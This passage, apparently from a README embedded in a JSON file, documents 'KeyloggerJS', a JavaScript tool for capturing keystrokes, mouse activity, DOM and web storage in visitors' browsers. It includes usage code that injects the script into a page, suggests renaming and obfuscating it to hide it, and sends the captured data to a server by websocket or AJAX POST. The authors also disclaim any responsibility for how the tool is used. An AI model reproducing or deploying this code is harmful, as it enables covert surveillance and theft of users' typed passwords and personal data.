Of bases, the modules availables are **http**, **dom**, **WebStorage**, **keylog**, **mouse**, and everyone is free to propose new ones.\r\n\r\n### Philosophy, use && political.\r\nKeyloggerJS, its developers and contributors of all kinds are not responsible for the use made of distributed sources on Github. The internet is free, and we believe that everyone is mature enough to know what is good or not, what is acceptable or not.\r\n\r\nThis tool is developed by passion above all, everyone is free to contribute (if he wants to bring something to the project).\r\n\r\n### Documentation.\r\nDocumentation is available on **[Github wiki page](https://github.com/solikate/keyloggerJS/wiki)** !\r\n\r\nBut, here a example of utilisation. First, include KeyloggerJS : \r\n\r\n    //# You can change filename and obfuscate the code.\r\n    //# It is also possible to include dynamically from JavaScript (also obfuscated).\r\n    //# But, basically :\r\n    <script src=\"http://localhost/js/keylog.js\"></script>\r\n\r\nNext, run KeyloggerJS : `var keylog = new keylogger();`\r\n\r\n    // Now, we load a module for starting listening !\r\n    keylog.http(3000, function(data) {\r\n         // With websockets\r\n         var socket = io(\"http://localhost\");\r\n         socket.emit(\"httpKeylog\", data);\r\n\r\n        // With AJAX\r\n        var xhr = getXMLHttpRequest();\r\n        xhr.open(\"POST\", \"keylog.php\");\r\n        xhr.setRequestHeader(\"Content-Type\", \"application/json;charset=UTF-8\");\r\n        xhr.send(JSON.stringify(data));\r\n    });","google":"","note":"Don't delete this file!
